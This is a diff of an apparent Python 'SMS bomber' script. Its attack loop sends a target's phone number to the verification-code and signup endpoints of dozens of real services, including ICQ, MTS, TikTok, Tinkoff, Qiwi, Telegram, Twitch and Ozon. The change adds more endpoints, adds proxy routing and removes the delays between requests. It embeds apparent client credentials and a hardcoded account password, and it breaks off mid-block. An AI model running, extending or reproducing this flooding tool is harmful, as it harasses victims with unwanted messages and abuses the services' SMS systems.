@@ -27,10 +27,8 @@ import asyncio
 import datetime
 import requests
 from random import choice, randint
-from user_agent import generate_user_agent
 
 os.system("cls")
-now = datetime.datetime.now()
 
 t = time.monotonic()
 
@@ -9248,102 +9246,74 @@ heads = [
 	"Accept":'*/*'
 	}
 ]
-
 proxies = None
+HEADERS = random.choice(heads)
 
-def attack(number, time2):
-	HEADERS = random.choice(heads)
+def attack(number, number9, time2):
 	sent=0
-	number2=str(number)
-	number3="+"
-	number3+=str(number)
-	number4=""
-	try:
-		n9=int(str(number[:1]))
-		trn=str(number)
-		trn2=""
-		trn2+='+'
-		trn2+='7'
-		trn2+='('
-		trn2+=trn[1]
-		trn2+=trn[2]
-		trn2+=trn[3]
-		trn2+=')'
-		trn2+=trn[4]
-		trn2+=trn[5]
-		trn2+=trn[6]
-		trn2+='-'
-		trn2+=trn[7]
-		trn2+=trn[8]
-		trn2+='-'
-		trn2+=trn[9]
-		trn2+=trn[10]
-		trn3=int(trn2)
-		number4+='+'
-		number4+='7'
-		number4+=' '
-		number4+='('
-		number4+=trn[1]
-		number4+=trn[2]
-		number4+=trn[3]
-		number4+=')'
-		number4+=' '
-		number4+=trn[4]
-		number4+=trn[5]
-		number4+=trn[6]
-		number4+=' '
-		number4+=trn[7]
-		number4+=trn[8]
-		number4+=trn[9]
-		number4+=trn[10]
-	except:
-		pass
 
-	while time.monotonic() - t < time2:
+	while time.monotonic() - t < time2:	
+		now = datetime.datetime.now()
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()
 			url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
 			params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
-			requests.post(url, json = params, headers=HEADERS)
+			requests.post(url, json = params, headers=HEADERS, proxies=proxies)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://icq.com'))
 		except:
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://icq.com'))
 
 		try:
-			time.sleep(.40)
-			requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params = {"msisdn": number3}, headers=HEADERS, proxies=proxies)
+			now = datetime.datetime.now()
+			requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params = {"msisdn": number}, headers=HEADERS, proxies=proxies)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://mts.ru'))
 		except:
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://mts.ru'))
 
 		try:
-			time.sleep(.40)
-			requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number4}, headers=HEADERS, proxies=proxies)
-			sent += 1
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.eldorado.ru'))
-		except:
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.eldorado.ru'))
-
-		try:
-			time.sleep(.40)
-			requests.post("https://my.drom.ru/sign/code/37c1e0f630c205d7019f96cbb33cb6b9?sign=79192333355&return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1636961302", params = {"sign": number4, "return": "https://www.drom.ru/?tcb=1636961302"}, headers=HEADERS, proxies=proxies)
-			sent += 1
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.drom.ru'))
-		except:
-			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.drom.ru'))
-
-		try:
-			time.sleep(.40)
-			requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": n9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=HEADERS, proxies=proxies)
+			now = datetime.datetime.now()
+			requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=HEADERS, proxies=proxies)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tiktok.com'))
 		except:
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tiktok.com'))
 
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()
+			requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number}, headers=HEADERS, proxies=proxies)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://vkrabota.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://vkrabota.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=HEADERS, proxies=proxies)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.eldorado.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.eldorado.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://my.drom.ru/sign/code/37c1e0f630c205d7019f96cbb33cb6b9?sign=79192333355&return=https%3A%2F%2Fwww.drom.ru%2F%3Ftcb%3D1636961302", params = {"sign": number, "return": "https://www.drom.ru/?tcb=1636961302"}, headers=HEADERS, proxies=proxies)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.drom.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.drom.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=HEADERS, proxies=proxies)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tiktok.com'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tiktok.com'))
+
+		try:
+			now = datetime.datetime.now()
 			requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"}, data={"phone": number, "recaptcha": "off", "g-recaptcha-response": ""}, headers=HEADERS, timeout=2)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.mvideo.ru'))
@@ -9351,7 +9321,7 @@ def attack(number, time2):
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.mvideo.ru'))
 
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()
 			requests.post("https://stores-api.zakaz.ua/user/signup/", json={"phone": number}, headers={"Accept": "*/*", "Content-Type": "application/json", "Referer": "https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/", "User-Agent": generate_user_agent(device_type="desktop", os=("mac", "linux")), "x-chain": "megamarket"})
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://megamarket.zakaz.ua'))
@@ -9359,7 +9329,7 @@ def attack(number, time2):
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://megamarket.zakaz.ua'))
 		
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()
 			requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms", data={"phone": "+" + number}, headers=HEADERS, timeout=2)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://kfc.ru'))
@@ -9367,7 +9337,7 @@ def attack(number, time2):
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://kfc.ru'))
 		
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()		
 			requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": number}, headers=HEADERS, timeout=2)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://eda.yandex.ru'))
@@ -9375,7 +9345,7 @@ def attack(number, time2):
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://eda.yandex.ru'))
 
 		try:
-			time.sleep(.40)
+			now = datetime.datetime.now()			
 			requests.post("https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=HEADERS, timeout=2)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.citilink.ru'))
@@ -9383,9 +9353,161 @@ def attack(number, time2):
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.citilink.ru'))
 
 		try:
-			time.sleep(.40)
-			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + number}, headers={})
+			now = datetime.datetime.now()			
+			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'loginId': '+' + number}, headers=HEADERS)
 			sent += 1
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tinkoff.ru'))
 		except:
 			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://tinkoff.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.flipkart.com'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.flipkart.com'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post('https://cloud.mail.ru//api/v2/notify/applink', data={'phone': '+' + number, "api": "2", "email": "email", "x-email": "x-email"}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://cloud.mail.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://cloud.mail.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://youla.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://youla.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post('https://my.newtonschool.co:443/api/v1/user/otp', params={"registration": "true"}, data={"phone": '+' + number})
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://newtonschool.com'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://newtonschool.com'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post('https://mobile-api.qiwi.com/oauth/authorize', data={"response_type": "urn:qiwi:oauth:response-type:confirmation-id", "username": number, "client_id": "android-qw", "client_secret": "zAm4FKq9UnSe7id"}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://qiwi.com'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://qiwi.com'))
+		
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+		
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization", data = {"FastAuthorizationLoginLoadForm[login]": number, "FastAuthorizationLoginLoadForm[token]": "", "FastAuthorizationLoginLoadForm[isPhoneCall]": "0"}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.dns-shop.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.dns-shop.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://my.telegram.org'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://my.telegram.org'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://www.rabota.ru/remind", data = {'credential': number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.rabota.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.rabota.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}")
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.citilink.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.citilink.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://passport.twitch.tv/register?trusted_request=true", json = {'birthday': {'day': 17, 'month': 10, 'year': 1998},'client_id': 'qb1unb4b2q4t58fwldcbz2nnm46a8zp','include_verification_code': 'true','password':'RnlFjW22e_n32p8FF','phone_number': number,'username':'123vitek123'}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.twitch.tv'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.twitch.tv'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://api.sunlight.net/v3/customers/authorization", data = {'phone': number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://sunlight.net'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://sunlight.net'))		
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': '+'+number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json = {'phone': number, 'otpId': 0}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.ozon.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://www.ozon.ru'))		
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json = {'phone': '+'+number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://lenta.com'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://lenta.com'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json = {'phone_number': '+'+number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://eda.yandex.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://eda.yandex.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://cloud.mail.ru/api/v2/notify/applink", json = {'phone': '+'+number, 'api': 2, 'email': 'email', 'x-email': 'x-email'}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://cloud.mail.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://cloud.mail.ru'))
+
+		try:
+			now = datetime.datetime.now()
+			requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {'st.r.phone': number}, headers=HEADERS)
+			sent += 1
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[32m {}" .format(f'SUCCESS') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+		except:
+			print("\033[34m{}" .format(now.strftime('%Y-%m-%d / %H:%M:%S')) + "\033[37m {}" .format('|') + "\033[33m {}" .format(sent) + "\033[37m {}" .format('|') + "\033[31m {}" .format(f'FAILED ') + "\033[37m {}" .format('|') + "\033[35m {}" .format('https://ok.ru'))
+
+		try:
+			now = datetime.datetime.now()
